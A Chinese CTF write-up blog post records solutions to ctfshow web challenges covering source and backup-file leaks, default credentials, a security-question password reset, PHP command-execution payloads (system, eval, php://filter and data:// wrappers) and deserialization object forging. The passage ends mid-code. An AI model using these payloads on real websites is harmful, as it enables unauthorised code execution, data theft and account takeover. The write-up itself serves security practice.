<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Ctfshow做题记录 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="Ctfshow做题记录">
<meta property="og:description" content="2024.11.13重刷ctfshow题目，此文为记录"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-13T09:56:08+08:00"><meta property="article:modified_time" content="2024-11-13T09:56:08+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="Ctfshow做题记录"><meta name=twitter:description content="2024.11.13重刷ctfshow题目，此文为记录"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/><link rel=prev href=https://nexuzzz0.github.io/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Ctfshow做题记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/wp\/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/"},"genre":"posts","keywords":"ctfshow, wp","wordcount":2141,"url":"https:\/\/nexuzzz0.github.io\/posts\/wp\/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95\/","datePublished":"2024-11-13T09:56:08+08:00","dateModified":"2024-11-13T09:56:08+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#信息搜集>信息搜集</a><ul><li><a href=#web1>web1</a></li><li><a href=#web2>web2</a></li><li><a href=#web3>web3</a></li><li><a href=#web4>web4</a></li><li><a href=#web5>web5</a></li><li><a href=#web6>web6</a></li><li><a href=#web7>web7</a></li><li><a href=#web8>web8</a></li><li><a href=#web9>web9</a></li><li><a href=#web10>web10</a></li><li><a href=#web11>web11</a></li><li><a href=#web12>web12</a></li><li><a href=#web13>web13</a></li><li><a href=#web14>web14</a></li><li><a href=#web15>web15</a></li><li><a href=#web16>web16</a></li><li><a href=#web17>web17</a></li><li><a href=#web18>web18</a></li><li><a href=#web19>web19</a></li><li><a href=#web20>web20</a></li></ul></li><li><a href=#爆破>爆破</a><ul><li><a href=#web21>web21</a></li><li><a href=#web22>web22</a></li></ul></li><li><a href=#命令执行>命令执行</a><ul><li><a href=#web29>web29</a></li><li><a href=#web30>web30</a></li><li><a href=#web31>web31</a></li><li><a href=#web32>web32</a></li><li><a href=#web33>web33</a></li><li><a href=#web34>web34</a></li><li><a href=#web35>web35</a></li><li><a href=#web36>web36</a></li><li><a href=#web37>web37</a></li><li><a href=#web38>web38</a></li><li><a href=#web39>web39</a></li><li><a href=#web40>web40</a></li><li><a href=#web41>web41</a></li></ul></li><li><a href=#反序列化>反序列化</a><ul><li><a href=#web254>web254</a></li><li><a href=#web255>web255</a></li><li><a href=#web256>WEB256</a></li><li><a href=#web257>web257</a></li><li><a href=#web258>web258</a></li><li><a href=#web259>web259</a></li><li><a href=#web260>web260</a></li><li><a href=#web261>web261</a></li></ul></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ctfshow做题记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=13139-1111-1311>13139-1111-1311</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=13139-1111-1311>13139-1111-1311</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2141 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#信息搜集>信息搜集</a><ul><li><a href=#web1>web1</a></li><li><a href=#web2>web2</a></li><li><a href=#web3>web3</a></li><li><a href=#web4>web4</a></li><li><a href=#web5>web5</a></li><li><a href=#web6>web6</a></li><li><a href=#web7>web7</a></li><li><a href=#web8>web8</a></li><li><a href=#web9>web9</a></li><li><a href=#web10>web10</a></li><li><a href=#web11>web11</a></li><li><a href=#web12>web12</a></li><li><a href=#web13>web13</a></li><li><a href=#web14>web14</a></li><li><a href=#web15>web15</a></li><li><a href=#web16>web16</a></li><li><a href=#web17>web17</a></li><li><a href=#web18>web18</a></li><li><a href=#web19>web19</a></li><li><a href=#web20>web20</a></li></ul></li><li><a href=#爆破>爆破</a><ul><li><a href=#web21>web21</a></li><li><a href=#web22>web22</a></li></ul></li><li><a href=#命令执行>命令执行</a><ul><li><a href=#web29>web29</a></li><li><a href=#web30>web30</a></li><li><a href=#web31>web31</a></li><li><a href=#web32>web32</a></li><li><a href=#web33>web33</a></li><li><a href=#web34>web34</a></li><li><a href=#web35>web35</a></li><li><a href=#web36>web36</a></li><li><a href=#web37>web37</a></li><li><a href=#web38>web38</a></li><li><a href=#web39>web39</a></li><li><a href=#web40>web40</a></li><li><a href=#web41>web41</a></li></ul></li><li><a href=#反序列化>反序列化</a><ul><li><a href=#web254>web254</a></li><li><a href=#web255>web255</a></li><li><a href=#web256>WEB256</a></li><li><a href=#web257>web257</a></li><li><a href=#web258>web258</a></li><li><a href=#web259>web259</a></li><li><a href=#web260>web260</a></li><li><a href=#web261>web261</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>2024.11.13重刷ctfshow题目，此文为记录</p><h1 id=web入门 class=headerLink><a href=#web%e5%85%a5%e9%97%a8 class=header-mark></a>WEB入门</h1><h2 id=信息搜集 class=headerLink><a href=#%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86 class=header-mark></a>信息搜集</h2><h3 id=web1 class=headerLink><a href=#web1 class=header-mark></a>web1</h3><p>Ctrl+U看源码</p><h3 id=web2 class=headerLink><a href=#web2 class=header-mark></a>web2</h3><p>不能右键，继续Ctrl+U看源码</p><h3 id=web3 class=headerLink><a href=#web3 class=header-mark></a>web3</h3><p>请求包返回头里面<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644101.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web4 class=headerLink><a href=#web4 class=header-mark></a>web4</h3><p>提示看 robots.txt 发现提示 /flagishere.txt 直接访问 flag 在里面</p><h3 id=web5 class=headerLink><a href=#web5 class=header-mark></a>web5</h3><p>提示 phps源码泄露有时候能帮上忙<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644102.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web6 class=headerLink><a href=#web6 class=header-mark></a>web6</h3><p>提示源码泄露<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644103.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web7 class=headerLink><a href=#web7 class=header-mark></a>web7</h3><p>提示 版本控制很重要，但不要部署到生产环境更重要。
访问 <code>/.git/index.php</code></p><h3 id=web8 class=headerLink><a href=#web8 class=header-mark></a>web8</h3><p>提示 版本控制很重要，但不要部署到生产环境更重要。
访问 <code>/.svn/</code></p><h3 id=web9 class=headerLink><a href=#web9 class=header-mark></a>web9</h3><p>提示 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了
访问源码的缓存文件 index.php.swp<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644104.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web10 class=headerLink><a href=#web10 class=header-mark></a>web10</h3><p>给 flag 放cookie 里面了</p><h3 id=web11 class=headerLink><a href=#web11 class=header-mark></a>web11</h3><p>直接域名解析，我做的时候这个域名已经GG了<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644105.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web12 class=headerLink><a href=#web12 class=header-mark></a>web12</h3><p>访问robots.txt得到/admin/即后台登录路径，主页最下面那个帮助电话就是admin密码，登录即可</p><h3 id=web13 class=headerLink><a href=#web13 class=header-mark></a>web13</h3><p>提示 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p><p>翻到最下面可以看到INFORMATION那一列可以下载document，下载后里面有默认账号和密码admin和admin1103以及后台路径/system1103/login.php，登陆即可</p><h3 id=web14 class=headerLink><a href=#web14 class=header-mark></a>web14</h3><p>提示 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p><p>访问<code>/editor/</code>可以看到一个图标长得像回形针的插入文件功能，打开后选择文件空间即可遍历文件。最后访问<code>/nothinghere/fl000g.txt</code>即可拿到flag</p><h3 id=web15 class=headerLink><a href=#web15 class=header-mark></a>web15</h3><p>提示 公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p><p>网页最下面有个qq邮箱，查出来西安的，访问<code>/admin</code>，使用重置密码功能，密保问题是居住地，填西安后把密码重置为<code>admin7789</code>，然后登录即可</p><h3 id=web16 class=headerLink><a href=#web16 class=header-mark></a>web16</h3><p>提示 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>访问 <code>/tz.php</code> 这是版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h3 id=web17 class=headerLink><a href=#web17 class=header-mark></a>web17</h3><p>提示 备份的 sql 文件会泄露敏感信息
备份的sql文件，访问<code>/backup.sql</code></p><h3 id=web18 class=headerLink><a href=#web18 class=header-mark></a>web18</h3><p>一个小游戏，说玩到 101 分给 flag 那必然是不可能玩的
直接看源码<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644106.png 2x" sizes=auto alt=image.png></a></figure>访问<code>110.php</code>得到 flag</p><h3 id=web19 class=headerLink><a href=#web19 class=header-mark></a>web19</h3><p>看源码发现验证条件，直接 POST 提交出 flag<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644107.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web20 class=headerLink><a href=#web20 class=header-mark></a>web20</h3><p>提示 mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>直接查看url路径添加<code>/db/db.mdb</code> 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</p><h2 id=爆破 class=headerLink><a href=#%e7%88%86%e7%a0%b4 class=header-mark></a>爆破</h2><h3 id=web21 class=headerLink><a href=#web21 class=header-mark></a>web21</h3><p>非原字典</p><h3 id=web22 class=headerLink><a href=#web22 class=header-mark></a>web22</h3><p>域名失效</p><h2 id=命令执行 class=headerLink><a href=#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c class=header-mark></a>命令执行</h2><h3 id=web29 class=headerLink><a href=#web29 class=header-mark></a>web29</h3><p><code>?c=system('tac f*g.php');</code></p><h3 id=web30 class=headerLink><a href=#web30 class=header-mark></a>web30</h3><pre tabindex=0><code>?c=echo `tac f*`;
</code></pre><h3 id=web31 class=headerLink><a href=#web31 class=header-mark></a>web31</h3><pre tabindex=0><code>?c=passthru(&#34;tac%09fla*&#34;);
?c=eval($_GET[a]);&amp;a=system(&#39;cat flag.php&#39;);
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
</code></pre><h3 id=web32 class=headerLink><a href=#web32 class=header-mark></a>web32</h3><p><code>?c=include%0a$_GET[1]?>&amp;1=php://filter/convert.base64-encode/resource=flag.php</code>
嵌套eval+文件包含+伪协议</p><h3 id=web33 class=headerLink><a href=#web33 class=header-mark></a>web33</h3><p>同32</p><h3 id=web34 class=headerLink><a href=#web34 class=header-mark></a>web34</h3><p>多过滤 <code>:</code> <code>include</code>已经将语句闭合，不影响后面伪协议代码，payload同Web32</p><h3 id=web35 class=headerLink><a href=#web35 class=header-mark></a>web35</h3><p>多过滤 <code>&lt;</code> <code>=</code> payload同Web32</p><h3 id=web36 class=headerLink><a href=#web36 class=header-mark></a>web36</h3><p>多过滤 <code>/</code> 数字，将Web32的payload1改成a继续用</p><h3 id=web37 class=headerLink><a href=#web37 class=header-mark></a>web37</h3><p><code>?c=data://text/plain,&lt;?php system('tac fl*');?></code></p><h3 id=web38 class=headerLink><a href=#web38 class=header-mark></a>web38</h3><p><code>?c=data://text/plain,&lt;?= system('tac fl*');?></code></p><h3 id=web39 class=headerLink><a href=#web39 class=header-mark></a>web39</h3><p>强制给include添加后缀无法阻止伪协议内的php代码执行，只会在代码执行后报错
同38</p><h3 id=web40 class=headerLink><a href=#web40 class=header-mark></a>web40</h3><p>无参RCE<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644108.png 2x" sizes=auto alt=image.png></a></figure>还有一种方法
get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
next()将内部指针指向数组中的下一个元素，并输出。
array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411181644109.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web41 class=headerLink><a href=#web41 class=header-mark></a>web41</h3><h2 id=反序列化 class=headerLink><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 class=header-mark></a>反序列化</h2><h3 id=web254 class=headerLink><a href=#web254 class=header-mark></a>web254</h3><p><code>?username=xxxxxx&amp;password=xxxxxx</code></p><h3 id=web255 class=headerLink><a href=#web255 class=header-mark></a>web255</h3><pre tabindex=0><code></code></pre><p>GET:<code>?username=xxxxxx&amp;password=xxxxxx</code>
Cookie:<code>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></p><h3 id=web256 class=headerLink><a href=#web256 class=header-mark></a>WEB256</h3><p>username 和 password 不相等，并且 isVip 为 True</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span> <span class=o>=</span> <span class=s1>&#39;aaa&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span> <span class=o>=</span> <span class=s1>&#39;bbb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$isVip</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>ctfShowUser</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><h3 id=web257 class=headerLink><a href=#web257 class=header-mark></a>web257</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctfShowUser</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$password</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$isVip</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$class </span><span class=o>=</span> <span class=s1>&#39;info&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>        
</span></span><span class=line><span class=cl>	    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>=</span><span class=k>new</span> <span class=nx>info</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(</span><span class=nv>$u</span><span class=p>,</span><span class=nv>$p</span><span class=p>){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>===</span><span class=nv>$u</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=nv>$p</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>        
</span></span><span class=line><span class=cl>	    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>class</span><span class=o>-&gt;</span><span class=na>getInfo</span><span class=p>();</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>info</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$user</span><span class=o>=</span><span class=s1>&#39;xxxxxx&#39;</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>backDoor</span><span class=p>{</span>  
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$code</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getInfo</span><span class=p>(){</span>  
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>code</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nv>$username</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl><span class=nv>$password</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$password</span><span class=p>)){</span>    
